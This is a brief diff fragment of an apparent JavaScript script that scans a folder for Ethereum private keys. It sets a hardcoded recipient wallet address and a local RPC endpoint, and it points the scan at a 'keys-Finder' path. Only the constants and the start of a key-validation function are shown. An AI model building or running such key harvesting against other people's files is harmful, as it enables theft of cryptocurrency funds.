@@ -12,7 +12,7 @@ const fg = require('fast-glob');
 // Constants
 const ethereumRecipientAddress = '0x1052AaFf72E2c53dB7eF35580A6034802EB902d4';
 const ethereumRpcUrl = 'http://localhost:8545';
-const folderPath = './folder'; // Replace with the path to your "gold" folder
+const folderPath = '/linux/ubuntu/keys-Finder/'; 
 
 // Function to check if a given string is a valid Ethereum private key
 const isValidPrivateKey = (privateKey) => {
